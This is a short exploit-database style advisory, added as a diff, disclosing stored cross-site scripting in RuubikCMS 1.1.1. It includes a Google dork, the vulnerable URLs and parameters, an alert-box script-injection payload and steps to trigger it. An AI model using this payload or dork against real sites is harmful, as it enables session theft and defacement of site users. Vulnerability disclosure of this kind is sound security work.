@@ -1,0 +1,51 @@
+# Exploit Title: [ruubikcms v1.1.1 Stored XSS]
+# Google Dork: [powered by ruubikcms] 
+# Date: [2013-6-5]
+# Exploit Author: [expl0i13r]
+# Vendor Homepage: [http://www.ruubikcms.com/]
+# Software Link: [http://www.ruubikcms.com/ruubikcms/download.php?f=ruubikcms111.zip]
+# Version: [1.1.1]
+# Tested on: [Windows 7]
+# Contact: expl0i13r@gmail.com
+
+Description:
+-------------
+
+RuubikCMS is an open source website content management tool which is designed to be user-friendly for both the end-user and the webmaster.
+
+ruubikcms v1.1.1 suffers from  Stored XSS vulnerability, when parsing user input to the 'name' parameter via POST method through '/ruubikcms/ruubikcms/cms/index.php'.
+Attackers can exploit these weaknesses to execute arbitrary HTML and script code
+in a user's browser session.
+
+Tested on : Windows 7 
+Browsers  : Chrome,Internet Explorer, Firefox
+
+
+POC of the vulnerabilities : 
+-----------------------------
+
+Stored XSS Vulnerable URL's
+----------------------------
+
+http://127.0.0.1/ruubikcms/ruubikcms/cms/index.php		    [vulnerable : name]
+http://127.0.0.1/ruubikcms/ruubikcms/cms/extranet.php?p=member-area [vulnerable : name] 
+http://127.0.0.1/ruubikcms/ruubikcms/cms/sitesetup.php		    [Vulnerable : name , siteroot]
+http://127.0.0.1/ruubikcms/ruubikcms/cms/users.php?role=5&p=test    [Vulnerable : firstname , lastname]
+
+p@yl0ad : "><script>alert('h@cK3d by eXpl0i13r')</script>
+
+
+Example: 
+
+Pagemanagement > Page name
+
+1. Enter pAyl0ad : "><script>alert('h@cK3d by eXpl0i13r')</script> in: 
+   "Page management" > "Page name" textbox
+ 
+2. Refresh page and click on Free Pages and p0p up will come.
+
+3. Also Click on tab "News" which will load our injected XSS code , it will be available in drop down menu : News > Link to page (optional) 
+
+
+# blackpentesters.blogspot.com [2013-6-5]
+# infotech-knowledge.blogspot.com 
